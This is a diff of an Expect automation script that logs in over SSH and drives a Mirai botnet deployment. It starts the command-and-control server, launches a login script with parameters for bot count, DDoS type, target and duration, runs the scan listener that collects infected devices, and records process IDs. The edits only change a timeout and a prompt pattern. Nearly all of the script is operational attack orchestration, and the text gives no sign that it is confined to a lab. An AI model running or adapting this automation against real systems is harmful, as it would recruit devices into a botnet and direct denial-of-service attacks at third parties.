@@ -20,7 +20,7 @@ set input_bot_file "input_bot"
 set waitToFinishScan "WaitToFinishScan.py"
 set login_sh "login.sh"
 
-set timeout 120
+set timeout 10
 
 # SSH connection
 spawn /bin/bash $delKnownHosts
@@ -34,39 +34,39 @@ send "$password\r"
 expect "*:~# "
 send "cd $path/$mirai_path\r"
 
-expect "$mirai_path# "
+expect "*mirai# "
 send "chmod +x $path/$login_sh $path/$waitToFinishScan\r"
 
 # Create CNC Server
-expect "$mirai_path# "
+expect "*mirai# "
 send "nohup debug/cnc &\r"
 # Login to count bots and run DDoS attack
 #expect "*DB opened"
 expect "output to 'nohup.out'"
 send "\r"
-expect "$mirai_path# "
+expect "*mirai# "
 send "nohup $path/./$login_sh $numOfNewBots $DDoSType $targetedDDoS $dur $path $CNC_ip &\r"
 expect "output to 'nohup.out'"
 send "\r"
 
 # Run listening scanner server
-expect "$mirai_path# "
+expect "*mirai# "
 send "nohup debug/scanListen > $path/$mirai_path/$scanListenOutput &\r"
 expect "ignoring input and redirecting stderr to stdout"
 send "\r"
 
 # Wait to finish Scanning
-expect "$mirai_path# "
+expect "*mirai# "
 send "nohup python3 $path/$waitToFinishScan $path $mirai_path/$scanListenOutput $scanFinishedFile $numOfNewBots $debug_path $input_bot_file &\r"
 expect "output to 'nohup.out'"
 send "\r"
 
-expect "$mirai_path# "
+expect "*mirai# "
 send "ps -ef | grep 'debug/' | awk '{print \$2}' > $path/$pids_file\r"
-expect "$mirai_path# "
+expect "*mirai# "
 send "ps -ef | grep '$path/./$login_sh' | awk '{print \$2}' >> $path/$pids_file\r"
-expect "$mirai_path# "
+expect "*mirai# "
 send "ps -ef | grep 'python3 $path/$waitToFinishScan' | awk '{print \$2}' >> $path/$pids_file\r"
 
-expect "$mirai_path# "
+expect "*mirai# "
 send "exit\r"
